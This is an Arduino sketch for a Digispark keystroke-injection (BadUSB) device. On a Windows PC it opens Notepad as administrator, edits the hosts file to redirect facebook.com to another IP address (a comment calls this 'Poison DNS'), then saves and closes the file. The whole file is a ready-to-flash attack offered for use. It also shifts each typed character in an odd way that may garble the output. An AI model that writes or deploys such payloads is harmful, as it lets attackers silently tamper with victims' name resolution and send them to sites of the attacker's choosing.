#include <DigiKeyboard.h>
void setup() {
  // put your setup code here, to run once:
  DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(0,0);
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); //Click windows key
    DigiKeyboard.delay(1000);
    String toWrite = "NoTepad"; 
    
      for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }

    DigiKeyboard.println(toWrite); //Write notepad
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT); //Show more options shortcut
    DigiKeyboard.delay(400);
    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Open as administrator option
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT); //Press alt to show more options in a pop up window
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_T); //Select open notepad as administrator by pressing T
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT); //Press alt to choose between options in notepad
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_P); //Open file menu by pressing P
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_O); //Choose open file by pressing O
    DigiKeyboard.delay(600);
    toWrite = "C:\\Windows\\SysTem32\\drivers\\eTc\\hosTs\n";
    for(char i = 0 ; i < toWrite.length(); i++){
      toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); //Print path to hosts file
    DigiKeyboard.delay(200);
    toWrite = "20.112.52.29 www.facebook.com\n20.112.52.29 facebook.com\n";
    for(char i = 0 ; i < toWrite.length(); i++){
     toWrite.setCharAt(i, toWrite.charAt(i)+8);
    }
    DigiKeyboard.println(toWrite); //Poison DNS - in this instance using microsoft.com ip
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_S,MOD_CONTROL_LEFT); //Save hosts file
    DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT); //Close notepad
    
}

void loop() {
  // put your main code here, to run repeatedly:

}
